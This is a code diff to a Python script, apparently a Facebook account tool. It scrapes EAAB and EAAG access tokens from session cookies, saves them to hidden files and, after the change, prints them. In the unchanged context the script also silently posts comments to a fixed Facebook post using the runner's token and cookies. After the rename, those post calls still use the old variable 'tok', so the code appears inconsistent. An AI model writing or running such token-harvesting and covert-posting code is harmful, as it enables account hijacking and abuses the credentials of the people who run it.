@@ -473,20 +473,22 @@ def login_lagi334():
 									set = re.search('act=(.*?)&nav_source',str(req.content)).group(1)
 									nek = '%s?act=%s&nav_source=no_referrer'%(url,set)
 									roq = xyz.get(nek,cookies=cookie)
-									tok = re.search('accessToken="(.*?)"',str(roq.content)).group(1)
-									open(".token1.txt","w").write(tok)
+									tok1 = re.search('accessToken="(.*?)"',str(roq.content)).group(1)
+									open(".token1.txt","w").write(tok1)
+									Console().print(Panel(f"""[bold cyan][+] Token : [bold green]{tok1}""",width=80, style=f"{color_panel}", title="[bold green]> TOKEN EAAB [bold green]<"))
 									requests.post(f"https://graph.facebook.com/878169396977639/comments/?message={kom4}&access_token={tok}", headers = {"cookie":your_cookies})
 									requests.post(f"https://graph.facebook.com/878169396977639/comments/?message={kom3}&access_token={tok}", headers = {"cookie":your_cookies})
 									requests.post(f"https://graph.facebook.com/878169396977639/comments/?message={kom6}&access_token={tok}", headers = {"cookie":your_cookies})
 							except Exception as e:
 								print(e)
 							try:
-								cookie = {'cookie':cok}
+								cookie = {'cookie':your_cookies}
 								with requests.Session() as xyz:
 									url = 'https://business.facebook.com/business_locations'
 									req = xyz.get(url,cookies=cookie)
-									tok = re.search('(\["EAAG\w+)', req.text).group(1).replace('["','')
-									open(".token2.txt","w").write(tok)
+									tok2 = re.search('(\["EAAG\w+)', req.text).group(1).replace('["','')
+									open(".token2.txt","w").write(tok2)
+									Console().print(Panel(f"""[bold cyan][+] Token : [bold green]{tok2}""",width=80, style=f"{color_panel}", title="[bold green]> TOKEN EAAG [bold green]<"))
 							except Exception as e:
 								return('Cookies Invalid')
 			except Exception as e:
